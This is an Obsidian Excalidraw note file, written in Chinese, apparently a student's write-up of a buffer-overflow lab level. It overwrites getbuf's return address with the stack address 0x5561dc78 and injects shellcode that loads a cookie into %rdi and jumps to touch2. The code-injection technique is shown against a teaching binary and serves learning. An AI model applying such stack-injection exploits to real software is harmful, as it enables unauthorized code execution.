---

excalidraw-plugin: parsed
tags: [excalidraw]

---
==⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠==


# Text Elements
与 level1 类似，将 getbuf 的返回值变为 touch2，
不同的是 touch2 需要传递一个参数，
因此我们构造出下面的汇编代码 ^uVCiOOPB

0000000000000000 <.text>:
   0:        68 ec 17 49 00               pushq  $0x4917ec
   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi
   c:        c3                           retq ^XSvY66vt

首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码  ^0T2AD1iV


# Embedded files
efbffb83894057343fb882506e43a242d65043d7: [[Pasted Image 20230207143013_778.png]]
4c909bc40269cecb2045e7a53d9e430cfd43ab97: [[Pasted Image 20230207143116_809.png]]
0ab8c93e3eb3ad970cd8ac6052090b9bf8b21a3e: [[Pasted Image 20230207134810_252.png]]
580b99fc879ae4eaa9e79aad0e42f8da2f2dec35: [[Pasted Image 20230207143941_134.png]]

%%
# Drawing
```json
{
	"type": "excalidraw",
	"version": 2,
	"source": "https://excalidraw.com",
	"elements": [
		{
			"type": "image",
			"version": 6,
			"versionNonce": 1974041122,
			"isDeleted": false,
			"id": "_7zW5EsneoyTZv8necwm6",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": -561.2447780837986,
			"y": -164.3999745383232,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 541.7912165499625,
			"height": 179.0920965817932,
			"seed": 942499554,
			"groupIds": [],
			"roundness": null,
			"boundElements": [],
			"updated": 1675751412742,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "efbffb83894057343fb882506e43a242d65043d7",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "image",
			"version": 150,
			"versionNonce": 985956962,
			"isDeleted": false,
			"id": "5dA8I1GNyOEsW-o7AridK",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": -559.5053956347106,
			"y": 51.707425735841724,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 589.8032814541727,
			"height": 239.60758309075766,
			"seed": 1556043106,
			"groupIds": [],
			"roundness": null,
			"boundElements": [],
			"updated": 1675751476234,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "4c909bc40269cecb2045e7a53d9e430cfd43ab97",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "image",
			"version": 202,
			"versionNonce": 955046142,
			"isDeleted": false,
			"id": "d2kQpJvNfFhq9O0FgMKUI",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": -561.3304386956329,
			"y": -400.09802284682655,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 540.2573063033127,
			"height": 212.72631435692938,
			"seed": 777177570,
			"groupIds": [],
			"roundness": null,
			"boundElements": null,
			"updated": 1675751575737,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "0ab8c93e3eb3ad970cd8ac6052090b9bf8b21a3e",
			"scale": [
				1,
				1
			]
		},
		{
			"id": "th5UNI7AY-p0rOalADcRi",
			"type": "arrow",
			"x": -186.0032794952761,
			"y": -350.98951837375,
			"width": 295.8152499948954,
			"height": 70.41135851967454,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": {
				"type": 2
			},
			"seed": 1449510462,
			"version": 308,
			"versionNonce": 563072574,
			"isDeleted": false,
			"boundElements": null,
			"updated": 1675752005306,
			"link": null,
			"locked": false,
			"points": [
				[
					0,
					0
				],
				[
					295.8152499948954,
					70.41135851967454
				]
			],
			"lastCommittedPoint": null,
			"startBinding": null,
			"endBinding": {
				"elementId": "uVCiOOPB",
				"focus": -0.3961647047422323,
				"gap": 3.403954660006974
			},
			"startArrowhead": null,
			"endArrowhead": "triangle"
		},
		{
			"type": "text",
			"version": 281,
			"versionNonce": 81602786,
			"isDeleted": false,
			"id": "uVCiOOPB",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": 113.21592515962635,
			"y": -307.0742000773794,
			"strokeColor": "#000000",
			"backgroundColor": "transparent",
			"width": 436,
			"height": 84,
			"seed": 855860386,
			"groupIds": [
				"7Jt7kUPltY4dnMMTC7-FS"
			],
			"roundness": null,
			"boundElements": [
				{
					"id": "th5UNI7AY-p0rOalADcRi",
					"type": "arrow"
				}
			],
			"updated": 1675752005306,
			"link": null,
			"locked": false,
			"fontSize": 20,
			"fontFamily": 2,
			"text": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码",
			"rawText": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码",
			"baseline": 77,
			"textAlign": "left",
			"verticalAlign": "top",
			"containerId": null,
			"originalText": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码"
		},
		{
			"id": "XSvY66vt",
			"type": "text",
			"x": 105.843311413815,
			"y": -201.3629561412553,
			"width": 601,
			"height": 74,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [
				"7Jt7kUPltY4dnMMTC7-FS"
			],
			"roundness": null,
			"seed": 551140094,
			"version": 239,
			"versionNonce": 1523170466,
			"isDeleted": false,
			"boundElements": null,
			"updated": 1675752005306,
			"link": null,
			"locked": false,
			"text": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq",
			"rawText": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq",
			"fontSize": 15.785851095702789,
			"fontFamily": 3,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 71,
			"containerId": null,
			"originalText": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq"
		},
		{
			"id": "On8eO1i5_exTfQcFCz14_",
			"type": "image",
			"x": 164.18285661695302,
			"y": -91.22744451011337,
			"width": 460.0971691472244,
			"height": 239.2223011363636,
			"angle": 0,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 801419518,
			"version": 341,
			"versionNonce": 401570046,
			"isDeleted": false,
			"boundElements": null,
			"updated": 1675752007924,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "580b99fc879ae4eaa9e79aad0e42f8da2f2dec35",
			"scale": [
				1,
				1
			]
		},
		{
			"id": "0T2AD1iV",
			"type": "text",
			"x": 143.9967205047243,
			"y": 196.08079412625034,
			"width": 807,
			"height": 28,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 1145557374,
			"version": 187,
			"versionNonce": 720427198,
			"isDeleted": false,
			"boundElements": null,
			"updated": 1675752060251,
			"link": null,
			"locked": false,
			"text": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 ",
			"rawText": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 ",
			"fontSize": 20,
			"fontFamily": 3,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 21,
			"containerId": null,
			"originalText": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 "
		},
		{
			"id": "8A2fGS75",
			"type": "text",
			"x": 113.27583982290605,
			"y": 50.54741344443204,
			"width": 7,
			"height": 23,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 1217730530,
			"version": 3,
			"versionNonce": 1605094306,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1675751663170,
			"link": null,
			"locked": false,
			"text": "",
			"rawText": "",
			"fontSize": 20,
			"fontFamily": 2,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 19,
			"containerId": null,
			"originalText": ""
		},
		{
			"id": "DvCeFuiQ",
			"type": "text",
			"x": 41.621010277451546,
			"y": 99.70295321715923,
			"width": 251,
			"height": 23,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 1619311394,
			"version": 22,
			"versionNonce": 291881598,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1675751704480,
			"link": null,
			"locked": false,
			"text": "0000000000000000 <.text>:",
			"rawText": "0000000000000000 <.text>:",
			"fontSize": 20,
			"fontFamily": 2,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 19,
			"containerId": null,
			"originalText": "0000000000000000 <.text>:"
		},
		{
			"id": "Do5fOVJK",
			"type": "text",
			"x": 41.621010277451546,
			"y": 132.70295321715923,
			"width": 442,
			"height": 23,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 1670479870,
			"version": 22,
			"versionNonce": 1923886178,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1675751704480,
			"link": null,
			"locked": false,
			"text": "0:        68 ec 17 49 00               pushq  $0x4917ec",
			"rawText": "0:        68 ec 17 49 00               pushq  $0x4917ec",
			"fontSize": 20,
			"fontFamily": 2,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 19,
			"containerId": null,
			"originalText": "0:        68 ec 17 49 00               pushq  $0x4917ec"
		},
		{
			"id": "xY4rKwlr",
			"type": "text",
			"x": 41.621010277451546,
			"y": 165.70295321715923,
			"width": 515,
			"height": 23,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 2017789666,
			"version": 22,
			"versionNonce": 2126824126,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1675751704480,
			"link": null,
			"locked": false,
			"text": "5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi",
			"rawText": "5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi",
			"fontSize": 20,
			"fontFamily": 2,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 19,
			"containerId": null,
			"originalText": "5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi"
		},
		{
			"id": "j5E8Rvyc",
			"type": "text",
			"x": 41.621010277451546,
			"y": 198.70295321715923,
			"width": 267,
			"height": 23,
			"angle": 0,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"groupIds": [],
			"roundness": null,
			"seed": 1604112446,
			"version": 22,
			"versionNonce": 1324109858,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1675751704480,
			"link": null,
			"locked": false,
			"text": "c:        c3                           retq",
			"rawText": "c:        c3                           retq",
			"fontSize": 20,
			"fontFamily": 2,
			"textAlign": "left",
			"verticalAlign": "top",
			"baseline": 19,
			"containerId": null,
			"originalText": "c:        c3                           retq"
		}
	],
	"appState": {
		"theme": "light",
		"viewBackgroundColor": "#ffffff",
		"currentItemStrokeColor": "#c92a2a",
		"currentItemBackgroundColor": "transparent",
		"currentItemFillStyle": "hachure",
		"currentItemStrokeWidth": 2,
		"currentItemStrokeStyle": "solid",
		"currentItemRoughness": 0,
		"currentItemOpacity": 100,
		"currentItemFontFamily": 3,
		"currentItemFontSize": 20,
		"currentItemTextAlign": "left",
		"currentItemStartArrowhead": null,
		"currentItemEndArrowhead": "triangle",
		"scrollX": 144.68580790436658,
		"scrollY": 60.485257010113266,
		"zoom": {
			"value": 1.1
		},
		"currentItemRoundness": "round",
		"gridSize": null,
		"colorPalette": {},
		"currentStrokeOptions": null,
		"previousGridSize": null
	},
	"files": {}
}
```
%%